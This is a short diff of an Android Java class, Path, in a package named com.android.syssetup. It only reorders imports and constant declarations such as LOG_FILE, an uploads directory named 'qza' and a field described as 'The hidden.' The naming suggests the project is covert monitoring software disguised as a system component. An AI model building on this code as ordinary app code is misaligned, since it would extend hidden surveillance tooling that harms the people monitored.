@@ -12,6 +12,7 @@ package com.android.syssetup.file;
 import android.os.Environment;
 import android.os.StatFs;
 
+import com.android.mm.M;
 import com.android.syssetup.Status;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.conf.Configuration;
@@ -19,7 +20,6 @@ import com.android.syssetup.util.Check;
 import com.android.syssetup.util.DateTime;
 import com.android.syssetup.util.Execute;
 import com.android.syssetup.util.Utils;
-import com.android.mm.M;
 
 import java.io.File;
 import java.io.IOException;
@@ -31,30 +31,26 @@ import java.io.IOException;
  */
 public class Path {
 
+	public static final String LOG_FILE = "android_logs"; //$NON-NLS-1$
 	/**
 	 * The Constant TAG.
 	 */
 	private static final String TAG = "PATH"; //$NON-NLS-1$
-
+	// public static final String DEBUG_DIR = "dwm/";
 	/**
 	 * The Constant CONF_DIR.
 	 */
 	private static String CONF_DIR; //$NON-NLS-1$
-	// public static final String DEBUG_DIR = "dwm/";
 	/**
 	 * The Constant MARKUP_DIR.
 	 */
 	private static String MARKUP_DIR; //$NON-NLS-1$
-
 	/**
 	 * The Constant LOG_DIR.
 	 */
 	private static String LOG_DIR; //$NON-NLS-1$
 	private static String UPLOADS = "qza";
 	private static String curLogFile;
-
-	public static final String LOG_FILE = "android_logs"; //$NON-NLS-1$
-
 	/**
 	 * The hidden.
 	 */
